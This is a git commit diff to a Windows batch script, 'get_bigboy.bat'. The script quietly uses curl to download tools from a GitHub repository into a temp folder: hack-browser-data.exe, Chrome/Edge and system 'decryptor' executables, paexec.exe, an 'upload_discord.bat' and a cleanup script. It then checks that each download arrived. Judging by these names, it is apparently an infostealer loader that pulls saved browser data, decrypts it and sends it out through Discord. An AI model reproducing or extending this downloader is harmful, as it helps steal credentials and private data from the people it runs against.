6caa7d5d4280bf4c5a897d715702ff5848a2da58
24-20 <106987713+24-20@users.noreply.github.com>
2024-12-22 17:28:14 +0100

    Update get_bigboy.bat

--- get_bigboy.bat
+++ get_bigboy.bat
@@ -35,11 +35,9 @@ cd "%tempdir%" || (
 
 echo Downloading files...
 curl -L -s -o process.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/process.bat
-curl -L -s -o stop_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/stop_browsers.bat
-curl -L -s -o start_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/start_browsers.bat
 curl -L -s -o hack-browser-data.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/hack-browser-data.exe
 
-curl -L -s -o chrome_decryptor.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/chrome_decryptor.exe
+curl -L -s -o chrome_edge_decryptor.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/chrome_edge_decryptor.exe
 curl -L -s -o system_decryptor.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/system_decryptor.exe
 
 curl -L -s -o paexec.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/paexec.exe
@@ -48,7 +46,7 @@ curl -L -s -o upload_discord.bat https://raw.githubusercontent.com/24-20/bigboy/
 curl -L -s -o cleanup.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/cleanup.bat
 
 REM Verify all critical downloads
-for %%F in (process.bat hack-browser-data.exe upload_discord.bat cleanup.bat chrome_decryptor.exe system_decryptor.exe) do (
+for %%F in (process.bat hack-browser-data.exe upload_discord.bat cleanup.bat chrome_edge_decryptor.exe system_decryptor.exe) do (
     if not exist "%%F" (
         echo Error: Failed to download %%F
         exit /b 4
